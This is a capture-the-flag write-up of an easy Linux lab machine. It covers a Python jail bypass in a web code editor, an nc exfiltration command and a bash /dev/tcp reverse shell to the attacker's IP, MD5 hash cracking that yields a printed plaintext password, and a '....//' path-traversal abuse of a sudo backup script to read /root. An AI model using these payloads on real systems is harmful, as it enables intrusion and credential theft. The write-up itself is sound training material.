<h1>CODE WRITE UP</h1>

{code.png}<br>

<h2>MACHINE INFORMATION</h2>

<b>Difficulty:</b> Easy<br>
<b>Operating System:</b> Linux<br>
<b>IP Address:</b> 10.10.11.62<br>
<b>Hostname:</b> None<br>
<b>Open Ports:</b> 22/tcp, 5000/tcp<br>
<b>Web Server:</b> Gunicorn v20.0.4<br>
<b>Addition:</b> Python, Backy<br>

<h2>SUMMARY</h2>

Code is an easy Linux machine featuring a Python Code Editor web application vulnerable to remote code execution through a Python Jail Bypass. After gaining access as the "app-production" user, I find crackable credentials in an SQLite3 database. Using these credentials, I gain access as the "martin" user, who has sudo permissions to execute a backup utility script called "backy.sh". This script contains a vulnerable section that can be exploited to create a backup copy of the "/root" directory, allowing me to retrieve the root flag.

<h3>STEP BY STEP</h3>

<b>1-</b> First start with nmap scan.

<code>nmap -sC -sV 10.10.11.62</code>

Result:

{ss1.png}<br>

As I can see, ports 22(SSH) and 5000(HTTP) are open.

<b>2-</b> Visit "10.10.11.62:5000".

{ss2.png}<br>

A Python code editor application welcomes me.

<b>3-</b> I immediately try to import a module such as "os".

{ss3.png}<br>

As I can see, the system has a filter mechanism for imported modules.

<b>4-</b> So I start researching how to bypass this filter mechanism and find the "Python Jail Bypass" technique. To understand the technique, I use this <a href="https://anee.me/escaping-python-jails-849c65cf306e">page</a>.

<b>5-</b> When I try the payload from the article, the system gives me the same error.

{ss4.png}<br>

I also try this payload for importing the "os" module, but again I hit the filter mechanism.

<b>6-</b> So I continue searching for a suitable payload for my situation. I find this <a href="https://medium.com/soulsecteam/some-simple-bypass-tricks-8f02455b098d">page</a>.

<b>7-</b> After reading the article, I use this payload.

<code>[w for w in 1..class.base.subclasses() if w.name=='Quitter'][0].init.globals['sy'+'s'].modules['o'+'s'].dict'sy'+'stem'</code>

As a result, there is no output, but there is also no error. This means the bypass is working, but it is not providing any visible output.

<b>8-</b> According to this information, I prepare a new payload.

<code>[w for w in 1..class.base.subclasses() if w.name=='Quitter'][0].init.globals['sy'+'s'].modules['o'+'s'].dict['sy'+'stem']('whoami | nc 10.10.14.142 8282')</code>

Then I start listening on my system.

<code>nc -lvnp 8282</code>

Result:

{ss5.png}<br>

And it works!

<b>9-</b> Now I just need to send a reverse shell to my system.

<code>[w for w in 1..class.base.subclasses() if w.name=='Quitter'][0].init.globals['sy'+'s'].modules['o'+'s'].dict['sy'+'stem']('bash -c "bash -i >& /dev/tcp/10.10.14.142/8282 0>&1"')</code>

Result:

{ss6.png}<br>

I got the shell.

<b>10-</b> When I go one level back in the directory, I find "user.txt".

{ss7.png}<br>

This is how I get the user flag!

<b>11-</b> I find the "database.db" file in the "/home/app-production/app/instance" path.

<code>file database.db</code>

Result:

{ss8.png}<br>

As I can see, the file type is SQLite3.

<b>12-</b> I use the "sqlite3" command to look inside the database file.

<code>sqlite3 database.db</code>

<code>.tables</code>

Result:

{ss9.png}<br>

There are only two tables here. The "user" table is my target.

<b>13-</b> So I get all the data from the "user" table.

<code>SELECT * FROM user</code>

Result:

{ss10.png}<br>

There are two user records. I get their passwords as MD5 hashes.

<b>14-</b> I use "crackstation.net" to crack the password hashes.

Result for the "development" user:

{ss11.png}<br>

Result for the "martin" user:

{ss12.png}<br>

I use Martin's credentials to establish an SSH connection.

<code>username: martin
password: nafeelswordsmaster</code>

<b>15-</b> Start an SSH connection as "martin".

<code>ssh martin@10.10.11.62</code>

Result:

{ss13.png}<br>

I can establish an SSH connection.

<b>16-</b> I look for sudo permissions for the "martin" user.

<code>sudo -l</code>

Result:

{ss14.png}<br>

I can execute "backy.sh" with sudo permissions.

<b>17-</b> When I look at the source code for "backy.sh", I notice that the script uses two filter mechanisms.

<code>cat /usr/bin/backy.sh</code>

The first mechanism is:

{ss15.png}<br>

There is a whitelist for directories that can be archived.

The second mechanism is:

{ss16.png}<br>

There is sanitization for "../". Therefore, if I use "....//", the code only removes the "../" part from the middle of the payload.

<b>18-</b> "backy.sh" uses "task.json" for its configuration. In "/home/martin/backups/" there is already an archived file and a "task.json" file. When I look at "task.json":

<code>cat task.json</code>

Result:

{ss17.png}<br>

There is a "directories_to_archive" section used to specify which directories will be archived.

<b>19-</b> I prepare my own configuration file as "fnwn_task.json".

<code>cp task.json fnwn_task.json</code>

I make some changes to the configuration file.

Result:

{ss18.png}<br>

I remove the "exclude" section and modify "directories_to_archive" to use my payload: "/home/....//root/".

<b>20-</b> I run the script with my configuration file.

<code>sudo /usr/bin/backy.sh fnwn_task.json</code>

Result:

{ss19.png}<br>

The script works without an error.

<b>21-</b> I get a file named "code_home_.._root_2025_April.tar.bz2". I extract the files.

<code>tar -xvf code_home_.._root_2025_April.tar.bz2</code>

Result:

{ss20.png}<br>

<b>22-</b> Now I just need to go to the extracted "/root" directory.

<code>cd ~/backup/root</code>

Result:

{ss21.png}<br>

And this is how I get the root flag!

<h2>RESOURCE</h2> <ul> <li><a href="https://anee.me/escaping-python-jails-849c65cf306e">PYTHON JAIL BYPASS EXPLANATION</a></li> <li><a href="https://medium.com/soulsecteam/some-simple-bypass-tricks-8f02455b098d">PYTHON JAIL BYPASS PAYLOAD</a></li> </ul>
